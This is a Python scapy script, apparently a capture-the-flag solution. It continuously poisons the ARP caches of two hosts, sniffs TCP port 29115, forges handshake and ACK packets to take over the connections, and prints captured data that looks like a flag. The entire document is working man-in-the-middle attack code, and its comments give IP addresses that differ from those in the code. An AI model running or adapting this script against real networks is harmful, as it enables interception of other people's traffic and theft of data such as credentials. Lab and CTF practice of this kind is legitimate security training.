#!/usr/bin/env python3
from scapy.all import *
import time

# We'll act as both hosts and capture any traffic
def arp_poison():
    while True:
        # Poison ARP cache of both hosts
        # Tell 10.0.200.240 that we are 10.0.157.77
        sendp(Ether(dst='dd:dd:dd:dd:dd:dd') / 
              ARP(op=2, psrc="10.0.40.161", pdst="10.0.93.252",
                  hwsrc=get_if_hwaddr("eth0")), 
              iface="eth0", verbose=0)
        
        # Tell 10.0.157.77 that we are 10.0.200.240
        sendp(Ether(dst='bb:bb:bb:bb:bb:bb') / 
              ARP(op=2, psrc="10.0.93.252", pdst="10.0.40.161",
                  hwsrc=get_if_hwaddr("eth0")), 
              iface="eth0", verbose=0)
        time.sleep(1)

# Start ARP poisoning
import threading
threading.Thread(target=arp_poison, daemon=True).start()

print("ARP poisoning active...")

# Now let's try to intercept and respond to TCP connections
def handle_packet(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 29115:
        print(f"TCP packet: {packet[IP].src} -> {packet[IP].dst} flags={packet[TCP].flags}")
        
        # If it's a SYN packet, try to complete handshake and get data
        if packet[TCP].flags == 'S':  # SYN
            print("Got SYN packet - attempting to complete handshake...")
            
            # Send SYN-ACK
            syn_ack = Ether(dst=packet[Ether].src, src=get_if_hwaddr("eth0")) / \
                     IP(dst=packet[IP].src, src=packet[IP].dst) / \
                     TCP(sport=29115, dport=packet[TCP].sport, 
                         flags='SA', seq=1000, ack=packet[TCP].seq + 1)
            sendp(syn_ack, iface="eth0", verbose=0)
            print("Sent SYN-ACK")
            
        # If it's a PSH+ACK (data packet), extract the data
        elif packet[TCP].flags == 'PA' and packet.haslayer(Raw):
            data = packet[Raw].load
            print(f"Data packet: {data}")
            
            if b'flag' in data.lower() or b'CTF' in data or b'{' in data:
                print(f"*** FLAG FOUND: {data} ***")
            
            # Send ACK for the data
            ack = Ether(dst=packet[Ether].src, src=get_if_hwaddr("eth0")) / \
                  IP(dst=packet[IP].src, src=packet[IP].dst) / \
                  TCP(sport=29115, dport=packet[TCP].sport, 
                      flags='A', seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[Raw].load))
            sendp(ack, iface="eth0", verbose=0)

# Sniff for TCP traffic
print("Listening for TCP traffic on port 29115...")
sniff(filter="tcp port 29115", prn=handle_packet, iface="eth0")
